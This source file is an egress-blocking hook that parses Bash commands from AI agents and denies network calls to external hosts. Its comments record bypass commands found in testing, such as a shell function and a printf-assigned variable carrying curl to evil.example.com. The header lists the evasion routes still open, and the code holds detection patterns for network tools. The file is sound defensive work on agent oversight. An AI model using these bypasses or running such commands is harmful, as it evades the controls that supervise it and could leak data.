#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes those three shapes, plus the heredoc-fed interpreter, by PARSING
// the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval, PowerShell
//      with -Command) whose code uses a network primitive and carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND. A `for`
//      loop word list and the stdin of a `while read` loop (here-string or heredoc) count as such
//      assignments, split on whitespace the way a default `read` splits a line;
//   4. (EGRESSHEREDOC924, kanban 4c108004) a heredoc / here-string that IS an interpreter's program
//      (`python3 - <<'PY'`, `node <<EOF`, `powershell.exe -Command - <<'PS'`): its body is judged
//      exactly like a one-liner body (2.). For a shell (bash/sh/zsh/dash/ksh) the body gets the whole
//      analysis, as if it were the command itself.
// The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
// their own options (timeout, gtimeout, stdbuf, nice, ionice, caffeinate, nohup, env, sudo, command,
// exec, time, xargs), on every path.
//   5. (card c8b1ccbf) the body of `bash/sh/zsh -c BODY` gets the whole analysis; a substitution is
//      read with the assignments and loop values of the line it sits in; a URL written inside a
//      substitution that fills a variable is a value of that variable; a network command behind
//      `xargs` is denied for any external URL in the command, since its arguments come from stdin.
// FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
// even when the call goes to localhost and the URL is only payload or a comment: the one-liner rule,
// applied to heredoc bodies. ONE relaxation, from the maintainers' decision on #1669 (2026-10-06): a
// PYTHON heredoc that merely MENTIONS a primitive and a URL in TEXT (the file it writes, a comment)
// is not a call and passes. "Text" is decided by reading the program with its string literals and
// comments blanked: a primitive that survives is code and the old rule applies. The relaxation is
// OFF, and the old whole-text rule decides, for any body that (a) holds a construct that can RUN a
// string or load code (exec, eval, compile, __import__, importlib, getattr, globals, subprocess,
// os.system ... see PY_DYNAMIC), (b) imports anything outside PY_PLAIN_MODULES (so a module the
// heredoc just wrote cannot be imported to do the call), (c) has an f-string (it runs its braces,
// so its content stays code) with unbalanced braces, or a string the scan cannot read to its end.
// Not relaxed: node, perl, ruby, php, deno, bun, PowerShell, and one-liners (-c). A written script
// that is RUN BY ANOTHER COMMAND is the "network calls inside a script file" family below: the hook
// never sees it, and the relaxation does not change that, it only stops denying the WRITE of it.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span. A heredoc body is read only
// where it is stdin to an interpreter or a `read` loop (4. and 3.); to anything else (`cat <<EOF`,
// `curl --data-binary @- <<'JSON'`) it stays inert text.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Still open, by family:
//   - network calls INSIDE a script file: the hook sees only the outer command line;
//   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
//     here-string attached to the interpreter itself;
//   - a destination that a DIFFERENT command reads from stdin and turns into arguments, other than
//     xargs (parallel, a while-read over a pipe), or that xargs reads from a file (-a, a pipe from cat);
//   - a command line held in a variable the command never assigns (`eval "$X"`, `bash -c "$X"`, `$X URL`);
//   - a command word glued from a substitution and literal text (`eval "$(echo cu)rl URL"`, `$(echo cu)rl URL`);
//     a command WORD the line cannot read (`X=$(...); $X URL`, `set -- ...; $1 URL`, `"${a[@]}"`) denies
//     only when the text that could set it names a network tool literally AND an external host, so a
//     tool name that is itself computed (`X=$(echo Y3VybA== | base64 -d)`) passes;
//   - values bound by builtins other than `for` and a plain `read`: array fillers (mapfile /
//     readarray), `read -a` elements beyond the first, and `read` under a non-default IFS (only
//     whitespace splitting is modelled);
//   - loop or command input that comes from a file, a process substitution or a pipe, not from a
//     literal here-string / heredoc in the command;
//   - a URL whose host is not literally in the command (the environment, a previous command, a curl
//     config file, or a value computed at runtime by a command substitution);
//   - a network primitive given a bare host and port with no URL scheme (socket-level connects): the
//     body scan finds destinations by URL scheme only;
//   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
//     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
//   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig, wget ...).
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-open on an internal error (logged): a crashed gate must not silence the fleet. Input the
// parser cannot READ is not a blind pass any more (card c8b1ccbf, shape 1: bash still runs it): a
// network tool together with an external destination in any spelling a network tool can take (a
// scheme URL, a schemeless host, a host behind a variable scheme, an IP) denies (unreadableVerdict);
// the rest passes as 'unparseable'. Every DENY is appended to the block log.
import { readFileSync, appendFileSync, realpathSync, mkdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { maskInertLiterals } from '../self-pace-gate.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// PER-AGENT hosts (card fa917eba, marveen 18139): `"agents": {"deeper": ["api.deltacrm.io"]}` in the
// same file. Only the agent the scaffold burnt into this hook's command (`--agent <name>`) gets its
// entry; every other agent sees nothing from it. Same shape check as "hosts" (exact DNS names, no
// wildcard / IP / port / userinfo). The scaffold ALSO drops the two `curl *https://*` deny rules for
// an agent with a non-empty entry -- a permissions.deny runs before this hook and always wins, so
// without that the entry could never let an https call through (bash-egress-deny.test.ts pins it).
// For such an agent this hook is therefore the ONLY curl-https gate, and it fails CLOSED where the
// rest of the fleet fails open: see the CLI block below.
const AGENT_NAME = /^[a-z0-9][a-z0-9_-]{0,63}$/i
export function parseAgentHosts(raw, agent) {
  if (!agent || !AGENT_NAME.test(agent)) return new Set()
  const agents = raw && typeof raw === 'object' && raw.agents && typeof raw.agents === 'object' && !Array.isArray(raw.agents) ? raw.agents : {}
  const list = Object.prototype.hasOwnProperty.call(agents, agent) && Array.isArray(agents[agent]) ? agents[agent] : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadAgentHosts(agent, path = VENDOR_HOSTS_PATH) {
  try { return parseAgentHosts(JSON.parse(readFileSync(path, 'utf-8')), agent) } catch { return new Set() }
}
/** `--agent <name>` from the hook's argv (the scaffold writes it); null when absent or malformed. */
export function agentFromArgv(argv) {
  const i = argv.indexOf('--agent')
  const v = i === -1 ? undefined : argv[i + 1]
  return typeof v === 'string' && AGENT_NAME.test(v) ? v : null
}
/** A command an agent with an https exception must not get through unread: curl + an https URL. */
const CURL_HTTPS = /\bcurl\b[\s\S]*https:\/\/|https:\/\/[\s\S]*\bcurl\b/i
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|powershell(?:\.exe)?|pwsh(?:\.exe)?)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// PowerShell (WSL reaches the Windows side with powershell.exe): its code flag is -Command (any
// case, any unambiguous prefix down to -c), and its network primitives are cmdlets and aliases that
// NET_PRIMITIVE does not name. `curl` / `wget` are listed here ONLY: in PowerShell they are aliases
// of Invoke-WebRequest, while in a Python body a "curl" word is a subprocess carrying data.
const POWERSHELL = /^(?:powershell|pwsh)(?:\.exe)?$/i
const PS_CODE_FLAG = /^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$/i
const PS_NET_PRIMITIVE = /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl|wget|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|Net\.Http\.HttpClient|Net\.Sockets)\b/i
function hasCodeFlag(cmd, args) {
  return args.some((w) => CODE_FLAG.has(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
}
function usesNetwork(cmd, text) {
  return NET_PRIMITIVE.test(text) || (POWERSHELL.test(cmd) && PS_NET_PRIMITIVE.test(text))
}

// --- Python heredoc: code versus text (maintainer decision on #1669) --------------------------------
const PYTHON = /^python(?:\d+(?:\.\d+)?)?$/
// Valid string prefixes, any case: r, b, u, f, and the two-letter br / rb / fr / rf.
const PY_STRING_PREFIX = /^(?:[rR][bBfF]?|[bB][rR]?|[uU]|[fF][rR]?)$/
// Constructs that can turn a string into running code, load code, start a process or open a URL. Read on
// the program with its literals blanked, so the NAME is what is seen. Never complete, by design: it is the
// first of two fences, the module allowlist below is the second, and both fall back to the OLD rule.
const PY_DYNAMIC = new RegExp('\\b(?:exec|eval|compile|__import__|importlib|import_module|getattr|setattr|delattr|globals|locals|vars|' +
  '__builtins__|builtins|__dict__|__loader__|runpy|subprocess|pty|ctypes|pickle|marshal|timeit|cProfile|profile|pdb|code|codeop|' +
  'webbrowser|multiprocessing|system|popen|startfile|exec[lv]\\w*|spawn\\w*|fork\\w*|posix_spawn\\w*)\\b')
// Modules a file-writing script plainly uses. Anything else, a module the heredoc may just have written
// included, sends the body back to the old whole-text rule.
const PY_PLAIN_MODULES = new Set(['os', 'sys', 'json', 're', 'pathlib', 'datetime', 'time', 'textwrap', 'shutil', 'csv', 'io',
  'hashlib', 'base64', 'collections', 'itertools', 'math', 'string', 'tempfile', 'glob', 'argparse', 'html', 'unicodedata', 'uuid',
  'random', 'statistics', 'zipfile', 'tarfile', 'difflib', 'pprint', 'typing', 'dataclasses', 'functools', 'operator', 'enum', 'fnmatch'])
// The program with its string literals and comments blanked (newlines kept), or null when the scan cannot
// vouch for where a string ends. An f-string is NOT blanked: it runs its braces, so its text counts as code.
export function pythonCodeOnly(text) {
  const out = []
  const n = text.length
  let i = 0
  while (i < n) {
    const c = text[i]
    if (c === '#') {
      let j = text.indexOf('\n', i)
      if (j === -1) j = n
      out.push(' '.repeat(j - i)); i = j; continue
    }
    if (c !== '"' && c !== "'") { out.push(c); i++; continue }
    let k = i
    while (k > 0 && /[A-Za-z0-9_]/.test(text[k - 1])) k--
    const word = text.slice(k, i)
    if (word !== '' && !PY_STRING_PREFIX.test(word)) return null   // return"x", ab"x": not a plain literal
    const triple = text.startsWith(c.repeat(3), i)
    const delim = triple ? c.repeat(3) : c
    let j = i + delim.length
    let closed = false
    while (j < n) {
      if (text[j] === '\\') { j += 2; continue }
      if (text.startsWith(delim, j)) { closed = true; break }
      if (!triple && text[j] === '\n') return null                // unterminated single-line string
      j++
    }
    if (!closed) return null
    const body = text.slice(i + delim.length, j)
    if (/[fF]/.test(word)) {
      // Brace balance: an unbalanced f-string means this scan ended it where Python (3.12 allows the same
      // quote inside the braces) did not, and from there on the scan would be blanking real code.
      const open = (body.match(/\{/g) ?? []).length, close = (body.match(/\}/g) ?? []).length
      if (open !== close) return null
      out.push(delim + body + delim)
    } else {
      out.push(delim + body.replace(/[^\n]/g, ' ') + delim)
    }
    i = j + delim.length
  }
  return out.join('')
}
function pythonImportsPlain(code) {
  for (const raw of code.split(/[\n;]/)) {
    const st = raw.trim()
    if (!/\bimport\b/.test(st)) continue
    let m
    if ((m = /^import\s+(.+)$/.exec(st))) {
      for (const part of m[1].split(',')) if (!PY_PLAIN_MODULES.has(part.trim().split(/\s+/)[0].split('.')[0])) return false
    } else if ((m = /^from\s+([\w.]+)\s+import\b/.exec(st))) {
      if (!PY_PLAIN_MODULES.has(m[1].split('.')[0])) return false
    } else return false                                           // `try: import x`, `x = 1; import` glued forms
  }
  return true
}
// Does this Python body USE the network, as opposed to MENTION it? Only a primitive in CODE counts, and
// only when nothing in the body can run a string or load code (see the header).
function pythonUsesNetwork(text) {
  // Python reads identifiers as NFKC, so a fullwidth `ｅｘｅｃ(...)` is `exec(...)`: normalize first, or
  // the fence below does not see it. The fallback rule reads the normalized text too, which is stricter.
  text = text.normalize('NFKC')
  const code = pythonCodeOnly(text)
  if (code === null || PY_DYNAMIC.test(code) || !pythonImportsPlain(code)) return NET_PRIMITIVE.test(text)
  return NET_PRIMITIVE.test(code)
}
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at.
export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
  'timeout', 'stdbuf', 'gtimeout', 'ionice', 'caffeinate', 'xargs', 'builtin', 'do', 'then', 'else', 'elif', '{', '(', '!'])
// A prefix COMMAND (not a keyword) may carry its own options before the real command word:
// `timeout -k 5 30 cmd`, `stdbuf -oL cmd`, `nice -n 5 cmd`, `env -u X A=1 cmd`, `sudo -u u cmd`.
// Every word starting with `-` is skipped; the options listed here also consume the next word.
// `timeout` additionally takes one positional DURATION. A missing entry here errs toward reading an
// option VALUE as the command word, which only hides a command; the per-prefix test catches that.
const PREFIX_OPT_VALUE = {
  env: new Set(['-u', '--unset', '-C', '--chdir', '-S', '--split-string']),
  sudo: new Set(['-u', '--user', '-g', '--group', '-h', '--host', '-p', '--prompt', '-C', '--close-from',
    '-D', '--chdir', '-r', '--role', '-t', '--type', '-U', '--other-user', '-T', '--command-timeout']),
  exec: new Set(['-a']),
  nice: new Set(['-n', '--adjustment']),
  timeout: new Set(['-s', '--signal', '-k', '--kill-after']),
  stdbuf: new Set(['-o', '--output', '-e', '--error', '-i', '--input']),
  gtimeout: new Set(['-s', '--signal', '-k', '--kill-after']),
  ionice: new Set(['-c', '--class', '-n', '--classdata', '-p', '--pid', '-P', '--pgid', '-u', '--uid']),
  caffeinate: new Set(['-t', '-w']),
  // xargs runs its first operand as the command (card c8b1ccbf); what it reads from stdin becomes
  // that command's arguments, which the curl rule below cannot see -- see viaXargs in classify.
  // -J / -R / -S are macOS (BSD) xargs: -J is its replace string (didi 36152)
  xargs: new Set(['-I', '-J', '-R', '-S', '-L', '-n', '-P', '-s', '-d', '-E', '-a', '--arg-file', '--delimiter',
    '--max-args', '--max-procs', '--max-chars', '--max-lines', '--eof', '--process-slot-var']),
}
// gtimeout is GNU timeout under Homebrew's name; ionice and caffeinate run their operand as a
// command. A prefix command missing here hid the curl behind it (didi 2026-10-13, card c8b1ccbf).
const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf',
  'gtimeout', 'ionice', 'caffeinate', 'xargs'])
const PREFIX_POSITIONALS = { timeout: 1, gtimeout: 1 }
// Index of the real command word in `mw` (a sub-command's words): assignments, prefix words and
// the prefix commands' own options and arguments are skipped.
export function commandIndex(mw) {
  let i = 0
  // xargs's replace string (`-I{}`, `-i`, `--replace`): an env operand holding it is an assignment
  // xargs fills from stdin (`xargs -I{} env {} curl`), not the command (didi 36059)
  let repl = null
  while (i < mw.length) {
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
    // A function definition's head: its body is a command line, run when the name is called.
    // `f(){ curl https://evil.example.com/x; }; f` passed the live gate: the command word read was
    // `f(){` (dexter, card d6b95892). Forms: `f(){`, `f()`, zsh `f () {`, `function f [()] {`.
    if (mw[i] === 'function') { i += 2; continue }
    if (/^\(\)[{(]?$/.test(mw[i + 1] ?? '') && !/^\(\)/.test(mw[i])) { i += 2; continue }
    if (/^[^=]*\(\)[{(]?$/.test(mw[i])) { i++; continue }
    // a body's opener standing alone (`f () ( curl`): the command is the next word
    if (/^[({]$/.test(mw[i])) { i++; continue }
    // `(command curl ...)`: a subshell's `(` is no part of the name (didi 36034)
    const p = normalizedName(mw[i])
    if (!PREFIX_WORDS.has(p)) break
    i++
    if (!PREFIX_COMMANDS.has(p)) continue
    const withValue = PREFIX_OPT_VALUE[p] ?? new Set()
    let positional = PREFIX_POSITIONALS[p] ?? 0
    let optsEnded = false
    while (i < mw.length) {
      const a = mw[i]
      // env still takes assignments after `--` (`xargs -I{} env -- {} curl`: the {} is an assignment
      // stdin fills, not the command; didi 36152); every other prefix's `--` ends its own part
      if (a === '--' && !optsEnded) { i++; optsEnded = true; if (p === 'env') continue; break }
      if (p === 'xargs' && !optsEnded) {
        if (a === '-I' || a === '-J') repl = mw[i + 1] ?? null
        else if (/^-[IJ]./.test(a)) repl = a.slice(2)
        else if (a === '-i' || a === '--replace') repl = '{}'
        else if (/^(?:-i|--replace=)./.test(a)) repl = a.replace(/^(?:-i|--replace=)/, '')
      }
      if (!optsEnded && a.startsWith('-') && a.length > 1) { i += withValue.has(a) ? 2 : 1; continue }
      if (p === 'env' && repl && a.includes(repl)) { i++; continue }
      // env takes ANY word holding `=` as an assignment, not only a NAME=: `env 'BASH_FUNC_echo%%=...'
      // curl ...` ran curl, and the word read as the command hid it (dexter, c8b1ccbf round 7)
      if (p === 'env' && /^[^=]+=/.test(a)) { i++; continue }
      if (positional > 0 && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) { positional--; i++; continue }
      break
    }
  }
  return i
}
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0
  const re = /&&|\|\||\|&|;|\||\n/g; let m // `|&` pipes stderr too (didi round 4 item 2)
  while ((m = re.exec(masked))) { out.push([start, m.index]); start = m.index + m[0].length }
  out.push([start, masked.length])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
function collectAssignments(orig, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      if (m[5]?.startsWith('(')) continue // an array: collectArrays
      env[m[1]] = m[3] ?? m[4] ?? m[5] ?? ''
    }
    for (const [name, value] of printfAssignments(seg)) env[name] = value
  }
  return env
}
// `NAME=(w1 w2 ...)`, written once and in no other way: `"${NAME[@]}"`, `"${NAME[*]}"` and `$NAME` in a
// curl argv stand for its words (the fleet's `H=(-H "Authorization: ..."); curl "${H[@]}" URL`, 42 of
// 21 086 fleet commands, d6b95892). A name written twice, or also by `+=`, `[i]=`, read, ... keeps its
// array unread, and its reference in a destination stays unreadable.
function collectArrays(orig, masked, env = {}) {
  const out = {}
  for (const m of masked.matchAll(/(?:^|[\s;&|(])(?:(?:local|declare|typeset|readonly|export)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)=\(/g)) {
    const name = m[1]
    const open = m.index + m[0].length
    const close = masked.indexOf(')', open)
    // every spelling of the name counts: a second `NAME=(...)`, `NAME+=`, `NAME[i]=`, `read NAME`
    const writes = [...masked.matchAll(new RegExp(String.raw`(?<![\w$#!{./@:-])${name}(?![\w./@:-])`, 'g'))].length
    if (close === -1 || writes !== 1) continue
    out[name] = shellWords(expand(orig.slice(open, close), env))
  }
  return out
}
// `printf -v NAME FORMAT ARGS...` assigns too (didi round 4 item 3: `printf -v h %s evil.example.com;
// curl $h` passed). The value is the format with its conversions filled from the arguments in order.
function printfAssignments(text) {
  const out = []
  for (const m of String(text).matchAll(/(?:^|[\s;&|(])printf\s+-v\s*([A-Za-z_][A-Za-z0-9_]*)\s+([^\n;&|)]*)/g)) {
    const [fmt = '', ...args] = shellWords(m[2])
    let k = 0
    const filled = fmt.replace(/%[-+ #0]*\d*(?:\.\d+)?[sbdiqxX]/g, () => args[k++] ?? '')
    out.push([m[1], [filled, ...args.slice(k)].join(' ')])
  }
  return out
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn (card 804ab1cf, didi 04:0x).
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
// `${NAME:-word}` and its kin (- = :- := + :+ ? :?) expand to `word` whenever NAME is unknown here,
// and the `+` forms to `word` exactly when it is set: `curl ${h:-evil.example.com}` reached curl with
// the default unread (didi round 4 item 3). A NAME this command sets keeps its value for - and =.
function expand(text, env) {
  text = text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)(:?[-=+?])([^}]*)\}/g, (all, name, op, word) => {
    if (op.endsWith('+')) return word
    if (op.endsWith('?')) return env[name] ?? all
    return env[name] ? env[name] : word
  })
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text) {
  // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
  // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
